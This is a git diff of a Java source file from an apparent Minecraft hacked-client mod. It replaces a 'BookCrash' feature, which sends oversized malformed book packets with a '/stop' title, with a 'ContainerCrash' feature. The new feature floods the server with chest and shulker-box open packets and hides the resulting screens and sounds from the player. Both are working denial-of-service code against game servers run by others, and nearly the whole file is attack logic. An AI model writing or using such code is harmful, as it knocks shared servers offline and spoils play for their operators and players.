@@ -1,90 +1,93 @@
 package me.dustin.crash.feature;
 
+import me.dustin.crash.event.EventPlaySound;
 import me.dustin.events.core.EventListener;
 import me.dustin.events.core.annotate.EventPointer;
+import me.dustin.jex.event.filters.KeyPressFilter;
 import me.dustin.jex.event.filters.PlayerPacketsFilter;
 import me.dustin.jex.event.filters.TickFilter;
+import me.dustin.jex.event.misc.EventKeyPressed;
+import me.dustin.jex.event.misc.EventSetScreen;
 import me.dustin.jex.event.misc.EventTick;
 import me.dustin.jex.event.player.EventPlayerPackets;
 import me.dustin.jex.feature.mod.core.Feature;
 import me.dustin.jex.feature.option.annotate.Op;
-import me.dustin.jex.helper.misc.ChatHelper;
 import me.dustin.jex.helper.misc.Wrapper;
 import me.dustin.jex.helper.network.NetworkHelper;
-import me.dustin.jex.helper.player.InventoryHelper;
-import net.minecraft.entity.Entity;
-import net.minecraft.entity.vehicle.BoatEntity;
-import net.minecraft.item.ItemStack;
-import net.minecraft.item.Items;
-import net.minecraft.nbt.NbtList;
-import net.minecraft.nbt.NbtString;
-import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
-import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
-import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
+import me.dustin.jex.helper.world.WorldHelper;
+import net.minecraft.block.AbstractChestBlock;
+import net.minecraft.block.Block;
+import net.minecraft.block.ShulkerBoxBlock;
+import net.minecraft.client.gui.screen.ingame.AbstractInventoryScreen;
+import net.minecraft.client.gui.screen.ingame.HandledScreen;
+import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
+import net.minecraft.util.Hand;
+import net.minecraft.util.hit.BlockHitResult;
+import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Direction;
+import net.minecraft.util.math.Vec3d;
+import org.lwjgl.glfw.GLFW;
 
-import java.util.ArrayList;
-import java.util.Optional;
-
-@Feature.Manifest(category = Feature.Category.MISC, description = "Tries to crash the server by sending bad book sign packets.")
-public class BookCrash extends Feature {
-
-    @Op(name = "Packet", all = {"BookUpdate", "CreativeAction"})
-    public String packetMode = "BookUpdate";
+@Feature.Manifest(category = Feature.Category.MISC, description = "Lags/crashes servers by spamming container opening packets. Press escape to toggle.")
+public class ContainerCrash extends Feature {
 
     @Op(name = "Packet Count", min = 1, max = 1000, inc = 5)
     public int packetCount = 100;
+    @Op(name = "No Sound")
+    public boolean noSound = true;
     @Op(name = "Auto Disable")
     public boolean autoDisable = true;
 
-    private final BoatPaddleStateC2SPacket PACKET = new BoatPaddleStateC2SPacket(true, true);
-
-    public BookCrash() {
+    public ContainerCrash() {
         setFeatureCategory(Category.valueOf("CRASH"));
     }
 
     @EventPointer
     private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
-        for (int i = 0; i < packetCount; i++)
-            sendBadBook();
+        for (int x = -4; x < 4; x++) {
+            for (int y = -4; y < 4; y++) {
+                for (int z = -4; z < 4; z++) {
+                    BlockPos blockPos = Wrapper.INSTANCE.getLocalPlayer().getBlockPos().add(x, y, z);
+                    Block block = WorldHelper.INSTANCE.getBlock(blockPos);
+                    if (block instanceof AbstractChestBlock<?> || block instanceof ShulkerBoxBlock) {
+                        BlockHitResult bhr = new BlockHitResult(new Vec3d(blockPos.getX(), blockPos.getY(), blockPos.getZ()), Direction.DOWN, blockPos, false);
+                        PlayerInteractBlockC2SPacket openPacket = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr);
+                        for (int i = 0; i < packetCount; i++) {
+                            NetworkHelper.INSTANCE.sendPacket(openPacket);
+                        }
+                    }
+                }
+            }
+        }
     }, new PlayerPacketsFilter(EventPlayerPackets.Mode.PRE));
+
+    @EventPointer
+    private final EventListener<EventKeyPressed> eventKeyPressedEventListener = new EventListener<>(eventKeyPressed -> {
+        setState(false);
+    }, new KeyPressFilter(EventKeyPressed.PressType.IN_GAME, GLFW.GLFW_KEY_ESCAPE));
+
+    @EventPointer
+    private final EventListener<EventSetScreen> eventSetScreenEventListener = new EventListener<>(eventSetScreen -> {
+        if (eventSetScreen.getScreen() == null)
+            return;
+        if (!Wrapper.INSTANCE.getMinecraft().isPaused() && !(eventSetScreen.getScreen() instanceof AbstractInventoryScreen<?>) && eventSetScreen.getScreen() instanceof HandledScreen<?>) {
+            eventSetScreen.setCancelled(true);
+            eventSetScreen.setScreen(null);
+        }
+    });
 
     @EventPointer
     private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
         if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
             setState(false);
-    }, new TickFilter(EventTick.Mode.POST));
+    }, new TickFilter(EventTick.Mode.PRE));
 
-    private void sendBadBook() {
-        String title = "/stop" + Math.random() * 400;
-        String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
-
-        switch (packetMode.toLowerCase()) {
-            case "bookupdate" -> {
-                ArrayList<String> pages = new ArrayList<>();
-
-                for (int i = 0; i < 50; i++) {
-                    StringBuilder page = new StringBuilder();
-                    page.append(mm255);
-                    pages.add(page.toString());
-                }
-
-                NetworkHelper.INSTANCE.sendPacket(new BookUpdateC2SPacket(InventoryHelper.INSTANCE.getInventory().selectedSlot, pages, Optional.of(title)));
-            }
-            case "creativeaction" -> {
-                ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
-                String author = "MineGame159" + Math.random() * 400;
-                NbtList pageList = new NbtList();
-
-                for (int i = 0; i < 50; ++i) {
-                    pageList.addElement(i, NbtString.of(mm255));
-                }
-
-                book.getNbt().put("title", NbtString.of(title));
-                book.getNbt().put("author", NbtString.of(author));
-                book.getNbt().put("pages", pageList);
-
-                NetworkHelper.INSTANCE.sendPacket(new CreativeInventoryActionC2SPacket(0, book));
-            }
-        }
-    }
+    @EventPointer
+    private final EventListener<EventPlaySound> eventPacketReceiveEventListener = new EventListener<>(eventPlaySound -> {
+        if (!noSound)
+            return;
+        String sound = eventPlaySound.getIdentifier().toString();
+        if (sound.equalsIgnoreCase("minecraft:block.chest.open") || sound.equalsIgnoreCase("minecraft:block.chest.close") || sound.equalsIgnoreCase("minecraft:block.shulker_box.open") || sound.equalsIgnoreCase("minecraft:block.shulker_box.close") || sound.equalsIgnoreCase("minecraft:block.enderchest.open") || sound.equalsIgnoreCase("minecraft:block.enderchest.close"))
+            eventPlaySound.cancel();
+    });
 }
